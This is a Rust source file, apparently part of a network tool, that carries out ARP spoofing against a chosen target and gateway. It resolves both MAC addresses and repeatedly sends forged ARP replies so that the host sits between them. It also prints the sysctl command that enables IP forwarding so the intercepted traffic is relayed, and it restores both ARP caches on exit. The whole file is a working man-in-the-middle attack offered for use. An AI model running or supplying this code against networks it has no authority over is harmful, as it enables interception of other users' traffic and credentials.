//! ARP spoofing: place this host between `target` and `gateway`, then restore
//! both ARP caches on exit so the LAN is left clean.

use std::net::Ipv4Addr;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::Duration;

use pnet::datalink::NetworkInterface;
use pnet::packet::arp::ArpOperations;

use crate::net::{build_arp, err, iface_ipv4, open_channel, resolve_mac};

pub fn run(
    iface: &NetworkInterface,
    target_ip: Ipv4Addr,
    gateway_ip: Ipv4Addr,
    interval: u64,
    running: Arc<AtomicBool>,
) -> std::io::Result<()> {
    let src_mac = iface.mac.ok_or_else(|| err("interface has no MAC"))?;
    let src_ip = iface_ipv4(iface).ok_or_else(|| err("interface has no IPv4"))?;

    println!("resolving MAC addresses...");
    let target_mac = resolve_mac(iface, src_mac, src_ip, target_ip, Duration::from_secs(3))
        .ok_or_else(|| err("could not resolve target MAC (is it up?)"))?;
    let gateway_mac = resolve_mac(iface, src_mac, src_ip, gateway_ip, Duration::from_secs(3))
        .ok_or_else(|| err("could not resolve gateway MAC (is it up?)"))?;
    println!("  target  {target_ip} -> {target_mac}");
    println!("  gateway {gateway_ip} -> {gateway_mac}");
    println!("\nto actually relay traffic, enable forwarding in another shell:");
    println!("  sudo sysctl -w net.ipv4.ip_forward=1");
    println!("\npoisoning every {}s — Ctrl+C to stop and restore...", interval.max(1));

    let (mut tx, _rx) = open_channel(iface, None)?;

    // Lie to the target that we own the gateway IP, and vice-versa.
    let poison_target = build_arp(
        src_mac,
        gateway_ip,
        target_mac,
        target_mac,
        target_ip,
        ArpOperations::Reply,
    );
    let poison_gateway = build_arp(
        src_mac,
        target_ip,
        gateway_mac,
        gateway_mac,
        gateway_ip,
        ArpOperations::Reply,
    );

    let mut rounds = 0u64;
    while running.load(Ordering::SeqCst) {
        tx.send_to(&poison_target, None);
        tx.send_to(&poison_gateway, None);
        rounds += 1;
        print!("\r  sent {rounds} poison round(s)");
        use std::io::Write;
        let _ = std::io::stdout().flush();
        thread::sleep(Duration::from_secs(interval.max(1)));
    }

    // Heal: broadcast the true mappings back to both hosts a few times.
    println!("\n\nrestoring ARP caches...");
    let heal_target = build_arp(
        gateway_mac,
        gateway_ip,
        target_mac,
        target_mac,
        target_ip,
        ArpOperations::Reply,
    );
    let heal_gateway = build_arp(
        target_mac,
        target_ip,
        gateway_mac,
        gateway_mac,
        gateway_ip,
        ArpOperations::Reply,
    );
    for _ in 0..5 {
        tx.send_to(&heal_target, None);
        tx.send_to(&heal_gateway, None);
        thread::sleep(Duration::from_millis(200));
    }
    println!("done — LAN restored.");
    Ok(())
}
